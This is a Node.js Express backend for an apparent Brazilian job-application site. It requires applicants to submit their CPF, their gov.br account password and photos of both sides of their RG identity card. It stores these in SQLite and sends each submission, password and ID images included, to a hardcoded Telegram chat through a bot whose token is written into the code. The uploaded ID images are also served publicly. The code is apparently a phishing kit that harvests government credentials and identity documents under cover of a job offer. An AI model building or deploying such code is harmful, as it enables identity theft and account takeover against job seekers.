const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const multer = require('multer');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const mime = require('mime-types');
const fs = require('fs');
const cors = require('cors');
const app = express();

app.use(express.json());

// Configuração de CORS
app.use(cors({
    origin: ['https://vagasbrasil.onrender.com'], // Use o domínio do Render
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

// Configuração do multer para upload de arquivos
const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ 
    storage,
    limits: { fileSize: 5 * 1024 * 1024 } // Limite de 5MB
}).fields([{ name: 'curriculo' }, { name: 'rg_frente' }, { name: 'rg_verso' }]);

// Conexão com SQLite e criação da tabela candidaturas
const db = new sqlite3.Database('./vagas.db', (err) => {
    if (err) console.error('Erro ao conectar ao SQLite:', err);
    else {
        console.log('Conectado ao SQLite');
        // Criar a tabela candidaturas se ela não existir
        db.run(`
            CREATE TABLE IF NOT EXISTS candidaturas (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                nome TEXT NOT NULL,
                email TEXT NOT NULL,
                telefone TEXT NOT NULL,
                cpf TEXT NOT NULL,
                senha_gov TEXT NOT NULL,
                curriculo_path TEXT NOT NULL,
                data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `, (err) => {
            if (err) console.error('Erro ao criar tabela candidaturas:', err);
            else {
                // Verificar se as colunas rg_frente_path e rg_verso_path existem
                db.all("PRAGMA table_info(candidaturas)", (err, columns) => {
                    if (err) console.error('Erro ao verificar colunas:', err);
                    else {
                        // Adicionar rg_frente_path se não existir
                        if (!columns.some(col => col.name === 'rg_frente_path')) {
                            db.run(`ALTER TABLE candidaturas ADD COLUMN rg_frente_path TEXT`, (err) => {
                                if (err) console.error('Erro ao adicionar coluna rg_frente_path:', err);
                                else console.log('Coluna rg_frente_path adicionada com sucesso.');
                            });
                        }
                        // Adicionar rg_verso_path se não existir
                        if (!columns.some(col => col.name === 'rg_verso_path')) {
                            db.run(`ALTER TABLE candidaturas ADD COLUMN rg_verso_path TEXT`, (err) => {
                                if (err) console.error('Erro ao adicionar coluna rg_verso_path:', err);
                                else console.log('Coluna rg_verso_path adicionada com sucesso.');
                            });
                        }
                    }
                });
            }
        });
    }
});

// Configuração do bot Telegram
const token = process.env.TELEGRAM_BOT_TOKEN || '7332904856:AAFQXw1Th9nH5wMRYf8Rt0HeRirLqFgbJR4';
const chatId = '5114449108';
const bot = new TelegramBot(token);

// Função para formatar mensagem de candidatura
const formatCandidaturaMessage = (cand) => {
    return `*Nova Candidatura Recebida*\n\n` +
           `*Nome:* ${cand.nome}\n` +
           `*Email:* ${cand.email}\n` +
           `*Telefone:* ${cand.telefone}\n` +
           `*CPF:* ${cand.cpf}\n` +
           `*Senha GOV:* ${cand.senha_gov}\n` +
           `*Currículo:* ${cand.curriculo_path}\n` +
           `*RG Frente:* ${cand.rg_frente_path || 'Não fornecido'}\n` +
           `*RG Verso:* ${cand.rg_verso_path || 'Não fornecido'}\n` +
           `*Data:* ${cand.data_criacao}`;
};

// Configuração do Webhook
const webhookPath = '/telegram-webhook';
const port = process.env.PORT || 3000;
const webhookUrl = process.env.WEBHOOK_URL || `https://vagasbrasil.onrender.com${webhookPath}`;

// Configurar o webhook
bot.setWebHook(webhookUrl).then(() => {
    console.log(`Webhook configurado para ${webhookUrl}`);
}).catch(err => {
    console.error('Erro ao configurar webhook:', err);
});

// Rota para receber atualizações do Telegram via webhook
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Comando /candidaturas no bot
bot.onText(/\/candidaturas/, (msg) => {
    if (msg.chat.id.toString() !== chatId) {
        return bot.sendMessage(msg.chat.id, 'Acesso negado.');
    }

    db.all('SELECT * FROM candidaturas', [], (err, rows) => {
        if (err || !rows.length) {
            return bot.sendMessage(chatId, 'Nenhuma candidatura encontrada.');
        }

        let mensagem = '*Candidaturas Recebidas*\n\n';
        rows.forEach(c => {
            mensagem += `*${c.nome}*\nEmail: ${c.email}\nTelefone: ${c.telefone}\nCPF: ${c.cpf}\nSenha GOV: ${c.senha_gov}\nCurrículo: ${c.curriculo_path}\nRG Frente: ${c.rg_frente_path || 'Não fornecido'}\nRG Verso: ${c.rg_verso_path || 'Não fornecido'}\nData: ${c.data_criacao}\n\n`;
        });
        bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
    });
});

// Rota POST /candidaturas
app.post('/candidaturas', (req, res) => {
    upload(req, res, (err) => {
        if (err) {
            console.error('Erro no upload:', err.message);
            return res.status(400).send(`Erro no upload: ${err.message}`);
        }

        const { nome, email, telefone, cpf, senha_gov } = req.body;
        const curriculo_path = req.files['curriculo']?.[0].path;
        const rg_frente_path = req.files['rg_frente']?.[0].path || null;
        const rg_verso_path = req.files['rg_verso']?.[0].path || null;

        console.log('Dados recebidos:', { nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path });

        if (!nome || !email || !telefone || !cpf || !senha_gov || !curriculo_path || !rg_frente_path || !rg_verso_path) {
            console.log('Campos faltando:', { nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path });
            return res.status(400).send('Todos os campos obrigatórios devem ser preenchidos.');
        }

        const query = `
            INSERT INTO candidaturas (nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)`;

        db.run(query, [nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path], function(err) {
            if (err) {
                console.error('Erro ao salvar candidatura:', err.message);
                return res.status(500).send(`Erro ao salvar candidatura: ${err.message}`);
            }

            db.get('SELECT * FROM candidaturas WHERE id = ?', [this.lastID], (err, cand) => {
                if (!err && cand) {
                    bot.sendMessage(chatId, formatCandidaturaMessage(cand), { parse_mode: 'Markdown' });
                    const curriculoType = mime.lookup(curriculo_path) || 'application/octet-stream';
                    bot.sendDocument(chatId, curriculo_path, {}, { contentType: curriculoType })
                        .catch(err => console.error('Erro ao enviar currículo:', err));
                    if (rg_frente_path) {
                        const rgFrenteType = mime.lookup(rg_frente_path) || 'application/octet-stream';
                        bot.sendDocument(chatId, rg_frente_path, {}, { contentType: rgFrenteType })
                            .catch(err => console.error('Erro ao enviar RG frente:', err));
                    }
                    if (rg_verso_path) {
                        const rgVersoType = mime.lookup(rg_verso_path) || 'application/octet-stream';
                        bot.sendDocument(chatId, rg_verso_path, {}, { contentType: rgVersoType })
                            .catch(err => console.error('Erro ao enviar RG verso:', err));
                    }
                } else if (err) {
                    console.error('Erro ao buscar candidatura:', err.message);
                }
            });

            res.send('Candidatura enviada com sucesso!');
        });
    });
});

// Servir arquivos da pasta uploads
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Servir frontend estático
app.use(express.static(path.join(__dirname, 'public')));
app.use((req, res) => {
    const indexPath = path.join(__dirname, 'public', 'index.html');
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.status(404).send('Página não encontrada');
    }
});

// Iniciar servidor
app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
});